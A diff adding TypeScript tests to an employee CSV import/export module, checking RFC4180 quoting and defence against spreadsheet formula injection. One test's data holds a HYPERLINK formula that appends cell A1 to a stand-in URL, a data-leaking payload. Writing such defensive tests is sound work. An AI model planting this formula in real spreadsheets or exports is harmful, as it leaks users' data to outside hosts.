@@ -90,6 +90,40 @@ test('importEmployees: 社員番号の重複を検出', () => {
   assert.ok(errors.some((e) => e.row === 2 && e.column === '社員番号'))
 })
 
+test('importEmployees: クォート付きフィールド（カンマ・二重引用符を含む社員番号）を取り込める（RFC4180・B-6）', () => {
+  const csv = [HEADER, '"=HYPERLINK(""http://example.com/""&A1,""click"")",70,62,56,49,7.4'].join('\n')
+  const { employees, errors } = importEmployees(csv, 1)
+  assert.equal(errors.length, 0)
+  assert.equal(employees?.[0].id, '=HYPERLINK("http://example.com/"&A1,"click")')
+})
+
+test('buildAssignmentCsv → importEmployees: フォーミュラインジェクション対象のIDが往復で保存される（B-6）', () => {
+  const emps: Employee[] = [
+    { id: '=1+1', sales: 70, mgmt: 60, dev: 55, training: 50, cost: 7 },
+    { id: '+1+1', sales: 65, mgmt: 70, dev: 50, training: 45, cost: 7.3 },
+    { id: '-1+1', sales: 68, mgmt: 55, dev: 62, training: 52, cost: 6.5 },
+    { id: '@SUM(1+1)', sales: 75, mgmt: 60, dev: 58, training: 50, cost: 7.1 },
+  ]
+  const assign: Record<string, UnitId> = { '=1+1': 'A', '+1+1': 'A', '-1+1': 'A', '@SUM(1+1)': 'A' }
+  const result = computeSimulationResult(assign, emps)
+  const csv = buildAssignmentCsv(emps, result)
+
+  // 出力側：数式評価を防ぐため ' を前置してから表計算ソフトに渡す
+  const lines = csv.split('\n')
+  assert.ok(lines[1].startsWith("'=1+1,"))
+  assert.ok(lines[2].startsWith("'+1+1,"))
+  assert.ok(lines[3].startsWith("'-1+1,"))
+  assert.ok(lines[4].startsWith("'@SUM(1+1),"))
+
+  // 入力側：再取込で元のIDに戻る（往復互換）
+  const { employees: back, errors } = importEmployees(csv, emps.length)
+  assert.equal(errors.length, 0)
+  assert.deepEqual(
+    back?.map((e) => e.id),
+    emps.map((e) => e.id),
+  )
+})
+
 test('buildAssignmentCsv: ヘッダと配置先を含む', () => {
   const emps: Employee[] = [
     { id: 'E1', sales: 60, mgmt: 55, dev: 50, training: 45, cost: 10 },
